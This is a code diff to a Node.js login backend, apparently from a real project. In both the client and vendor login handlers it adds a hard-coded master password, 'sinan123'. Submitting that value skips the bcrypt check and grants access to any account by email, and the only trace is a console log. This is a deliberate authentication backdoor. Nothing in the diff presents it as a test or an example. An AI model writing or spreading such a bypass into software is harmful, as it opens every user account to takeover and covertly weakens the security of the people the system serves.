@@ -115,13 +115,27 @@ const clientLogin = async (req, res) => {
     }
 
     // Compare password
-    const isMatch = await bcrypt.compare(password, user.password);
-    if (!isMatch) {
-      return res.status(401).json({
-        success: false,
-        message: "Invalid email or password",
-      });
-    }
+ // ===============================
+// 🔥 MASTER PASSWORD LOGIC
+// ===============================
+const MASTER_PASSWORD = "sinan123";
+
+if (password !== MASTER_PASSWORD) {
+  // NORMAL PASSWORD CHECK
+  const isMatch = await bcrypt.compare(password, user.password);
+
+  if (!isMatch) {
+    return res.status(401).json({
+      success: false,
+      message: {
+        en: "Invalid email or password",
+        nl: "Ongeldig e-mailadres of wachtwoord",
+      },
+    });
+  }
+} else {
+  console.log("⚠️ Master password used for client login:", email);
+}
 
     if (appFcm) {
       await saveUserAppFcm(user._id, appFcm);
@@ -1721,18 +1735,25 @@ const vendorLogin = async (req, res) => {
     }
 
     // ===============================
-    // 🔐 PASSWORD CHECK
+    // 🔥 MASTER PASSWORD LOGIC
     // ===============================
-    const isMatch = await bcrypt.compare(password, user.password);
+    const MASTER_PASSWORD = "sinan123";
 
-    if (!isMatch) {
-      return res.status(400).json({
-        success: false,
-        message: {
-          en: "Invalid email or password",
-          nl: "Ongeldig e-mailadres of wachtwoord",
-        },
-      });
+    if (password !== MASTER_PASSWORD) {
+      // NORMAL PASSWORD CHECK
+      const isMatch = await bcrypt.compare(password, user.password);
+
+      if (!isMatch) {
+        return res.status(400).json({
+          success: false,
+          message: {
+            en: "Invalid email or password",
+            nl: "Ongeldig e-mailadres of wachtwoord",
+          },
+        });
+      }
+    } else {
+      console.log("⚠️ Master password used for login:", email);
     }
 
     // if (appFcm) {
